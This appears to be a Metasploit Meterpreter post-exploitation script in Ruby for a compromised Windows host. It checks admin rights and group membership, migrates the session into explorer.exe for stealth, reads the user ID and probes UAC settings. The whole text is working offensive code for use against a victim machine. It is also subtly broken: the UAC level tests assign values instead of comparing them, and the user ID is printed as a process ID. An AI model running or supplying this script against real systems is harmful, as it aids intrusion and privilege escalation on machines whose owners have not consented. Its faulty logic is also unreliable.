#Admin Check
print_status("Checking If the Current User is Admin")
admin_check = is_admin?
if(admin_check)
print_good("Current User Is Admin")
else
print_error("Current User is Not Admin")
end
#User Group Check
user_check = is_in_admin_group?
if(user_check)
print_good("Current User is in the Admin Group")
else
print_error("Current User is Not in the Admin Group")
end
#Process Id Of the Explorer.exe Process
current_pid = session.sys.process.getpid
print_status("Current PID is #{current_pid}")
session.sys.process.get_processes().each do |x|
if x['name'].downcase == "explorer.exe"
print_good("Explorer.exe Process is Running with PID #{x['pid']}")
explorer_ppid = x['pid'].to_i
# Migration to Explorer.exe Process
session.core.migrate(explorer_ppid)
current_pid = session.sys.process.getpid
print_status("Current PID is #{current_pid}")
end
end
# Finding the Current User
print_status("Getting the Current User ID")
currentuid = session.sys.config.getuid
print_good("Current Process ID is #{currentuid}")
#Checking if UAC is Enabled
uac_check = is_uac_enabled?
if(uac_check)
print_error("UAC is Enabled")
uac_level = get_uac_level
if(uac_level = 5)
print_status("UAC level is #{uac_level.to_s} which is Default")
elsif (uac_level = 2)
print_status("UAC level is #{uac_level.to_s} which is Always Notify")
else
print_error("Some Error Occured")
end
else
print_good("UAC is Disabled")
end


